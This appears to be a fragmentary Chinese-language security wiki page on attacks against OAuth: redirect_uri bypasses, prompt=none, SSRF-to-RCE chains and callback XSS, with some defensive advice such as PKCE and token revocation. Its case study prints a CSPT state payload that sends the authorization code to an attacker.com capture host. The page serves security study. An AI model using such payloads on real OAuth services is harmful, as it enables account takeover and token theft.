...
impact: [身份伪造, 机密性破坏, 信息泄露, 权限提升, 远程代码执行]
risk_level: 严重
prerequisites:
...
> 关联文档：[Account Takeover](../../User%20input/Bypasses/Account%20Takeover/README.md) · [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md) · [CSRF](../../User%20input/Reflected%20Values/CSRF/README.md) · [Clickjacking](../../User%20input/Reflected%20Values/Clickjacking/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [CSPT + OAuth Code 劫持](./CSPT%20%2B%20OAuth%20Code%20劫持实战.md)
...
# 0x02 redirect_uri 攻击 — 回调验证绕过

## 2.1 redirect_uri 验证绕过原理
...
## 2.3 子路径攻击 — 允许列表域上的 Token 泄露

即使 `redirect_uri` 锁定在可信域，如果该域存在**攻击者可控制的路径或执行上下文**（旧应用平台、用户命名空间、CMS 上传等），且 OAuth 流程在 URL 中返回令牌：
...
重放尝试应当不仅失败，还应**撤销**该 code 已颁发的所有 token。否则检测到的重放仍让攻击者的第一个 token 保持活跃。
...
对于 Native App / SPA，应使用 **PKCE (RFC 7636)** 替代 `client_secret`：
...
Access Token 不应出现在用户浏览器中。检查以下路径：
...
## 6.1 Prompt Interaction Bypass (`prompt=none`)
...
## 7.3 Cookie 竞态（Two Links & Cookie）
...
ROPC Flow 不应在面向用户的授权服务器上暴露。如果必须存在，应强制要求 2FA 验证。

---

# 0x09 OAuth SSRF → RCE 攻击链

## 9.1 Dynamic Client Registration → SSRF
...
## 9.2 OAuth Discovery → OS Command Execution (CVE-2025-6514)
...
# 0x0A OAuth 回调页面的客户端攻击

## 10.1 error_description 反射 XSS
...
如果注入的 HTML/JS 能重新打开同一 URL → 客户端资源耗尽 / 重复弹窗 / 日志洪泛。
...
# 0x0B Clickjacking & 其他攻击向量

## 11.1 Clickjacking OAuth Consent 对话框
...
## 11.3 Referer/Header/Location 泄露 Code + State
...
# 0x0C 实战案例：CSPT + 反向代理 OAuth Code 劫持

> 完整案例分析见：[CSPT + OAuth Code 劫持实战](./CSPT%20%2B%20OAuth%20Code%20劫持实战.md)

### 攻击链核心

利用 CSPT（Client Side Path Traversal）操控 OAuth 回调路径，使认证 code 通过反向代理被发送至攻击者服务器：

```
state=https://target.app/users/legitPath/../../imageProxy/https://attacker.com/capture
```
...
当 `state` 参数被前端路由处理时，**客户端路径遍历**使浏览器向 `/imageProxy/` 发起请求，而 WAF 仅检查初始请求，无法检测后续跳转。
